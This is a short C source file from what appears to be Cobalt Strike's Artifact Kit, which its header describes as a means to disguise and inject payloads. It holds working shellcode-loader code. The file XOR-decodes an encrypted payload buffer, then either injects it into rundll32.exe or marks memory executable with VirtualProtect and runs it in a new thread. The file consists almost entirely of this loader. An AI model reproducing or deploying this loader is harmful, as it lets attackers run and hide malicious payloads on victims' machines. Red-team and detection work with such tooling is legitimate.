/*
 * Artifact Kit - A means to disguise and inject our payloads... *pHEAR*
 * (c) 2014 Strategic Cyber LLC
 *
 * See http://www.advancedpentest.com/license
 */

#include <windows.h>
#include <stdio.h>

#ifdef _MIGRATE_
#include "start_thread.c"
#include "injector.c"
void spawn(void * buffer, int length, char * key) {
	int x;
	for (x = 0; x < length; x++) {
		*((char *)buffer + x) = *((char *)buffer + x) ^ key[x % 4];
	}

	inject(buffer, length, "rundll32.exe");
}
#else
void run(void * buffer) {
	void (*function)();
	function = (void (*)())buffer;
	function();
}

void spawn(void * buffer, int length, char * key) {
	DWORD old;

	/* allocate the memory for our decoded payload */
	void * ptr = VirtualAlloc(0, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	int x;
	for (x = 0; x < length; x++) {
		char temp = *((char *)buffer + x) ^ key[x % 4];
		*((char *)ptr + x) = temp;
	}

	/* change permissions to allow payload to run */
	VirtualProtect(ptr, length, PAGE_EXECUTE_READ, &old);

	/* spawn a thread with our data */
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&run, ptr, 0, NULL);
}
#endif

